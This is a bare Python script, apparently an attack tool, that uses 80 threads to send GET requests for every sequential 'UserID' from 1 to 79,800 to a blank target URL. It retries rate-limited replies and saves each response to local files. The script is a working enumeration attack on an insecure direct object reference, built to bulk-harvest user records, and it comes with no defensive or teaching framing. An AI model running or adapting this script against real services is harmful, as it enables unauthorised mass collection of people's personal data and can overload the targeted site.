import threading, requests

END_NUM = 79800
URL = ""

def attack(x, y):
    filename = str(x) + "to" + str(y) + ".txt"
    for i in range(x, y):
        PARAMS = {'UserID': i}
        r = requests.get(url=URL, params=PARAMS)
        if(len(r.text) == 90):
            while(len(r.text)== 90):
                r = requests.get(url=URL, params=PARAMS)
                print("Retrying ID : ", i)
        f = open(filename, "a+")
        f.write(r.text)
    f.close()

if __name__ == "__main__":
	threads = []
	for i in range(0, END_NUM, 1000):
		t = threading.Thread(target=attack, args=((1 if i == 0 else i), (i + 1000)))
		threads.append(t)
		t.start()

	for t in threads:
		t.join()
